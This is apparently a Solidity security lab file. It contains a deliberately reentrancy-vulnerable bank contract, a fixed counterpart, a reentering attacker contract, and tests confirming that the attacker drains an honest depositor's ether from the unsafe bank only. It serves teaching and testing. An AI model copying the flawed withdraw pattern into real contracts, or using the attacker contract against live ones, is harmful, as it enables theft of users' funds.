// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @dev Deliberately flawed LAB control. Not a live deployed target.
contract D24LUnsafeBank {
    mapping(address => uint256) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount != 0, "NO_BALANCE");
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "TRANSFER_FAIL");
        balances[msg.sender] = 0;
    }
}

/// @dev Deliberately fixed control, same interface and initial states.
contract D24LGuardedBank {
    mapping(address => uint256) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount != 0, "NO_BALANCE");
        balances[msg.sender] = 0;
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "TRANSFER_FAIL");
    }
}

interface D24LBankInterface {
    function deposit() external payable;
    function withdraw() external;
}

contract D24LReenteringActor {
    D24LBankInterface internal bank;
    bool internal retried;
    bool public retrySucceeded;

    function attack(D24LBankInterface target) external payable {
        bank=target;
        bank.deposit{value:msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (!retried) {
            retried=true;
            (retrySucceeded,)=address(bank).call(abi.encodeWithSignature("withdraw()"));
        }
    }
}

/// @dev No RPC, no fork, no external contracts. Exact value deltas observed.
interface D24LVm { function deal(address who,uint256 amount) external; }

contract D24LBankValueTest {
    D24LVm constant vm=D24LVm(address(uint160(uint256(keccak256("hevm cheat code")))));

    function setUp() public { vm.deal(address(this), 10 ether); }

    function test_vulnerable_bank_yields_independent_evm_reentrancy_witness() public {
        D24LUnsafeBank bank = new D24LUnsafeBank();
        D24LReenteringActor actor = new D24LReenteringActor();
        bank.deposit{value:1 ether}(); // independent honest depositor
        actor.attack{value:1 ether}(D24LBankInterface(address(bank)));
        require(address(actor).balance==2 ether, "NO_ATTACKER_GAIN");
        require(actor.retrySucceeded(), "NO_REENTRANCY");
        require(address(bank).balance==0, "NO_DRAINAGE");
        require(bank.balances(address(this))==1 ether,"BENIGN_DEPOSIT_RECORD_MISSING");
        require(bank.balances(address(actor))==0,"ATTACKER_BALANCE_NOT_RESET");
        require(address(this).balance==8 ether,"ETH_CONSERVATION_VULNERABLE");
    }

    function test_same_actor_cannot_profit_against_update_before_call() public {
        D24LGuardedBank bank = new D24LGuardedBank();
        D24LReenteringActor actor = new D24LReenteringActor();
        bank.deposit{value:1 ether}();
        actor.attack{value:1 ether}(D24LBankInterface(address(bank)));
        require(!actor.retrySucceeded(),"REENTRANCY_SHOULD_FAIL");
        require(address(actor).balance==1 ether,"UNEXPECTED_ATTACKER_PROFIT");
        require(address(bank).balance==1 ether,"BENIGN_ASSETS_NOT_PRESERVED");
        require(bank.balances(address(this))==1 ether,"BENIGN_ACCOUNTING_BROKEN");
        require(bank.balances(address(actor))==0,"ATTACKER_BALANCE_NOT_RESET");
    }

    function test_without_attacker_the_unsafe_bank_can_withdraw_normally() public {
        D24LUnsafeBank bank = new D24LUnsafeBank();
        bank.deposit{value:1 ether}();
        uint256 before = address(this).balance;
        bank.withdraw();
        require(address(this).balance==before+1 ether,"ORDINARY_EXIT_FAILED");
        require(address(bank).balance==0 && bank.balances(address(this))==0,"EXIT_ACCOUNTING_FAILED");
    }

    receive() external payable {}
}
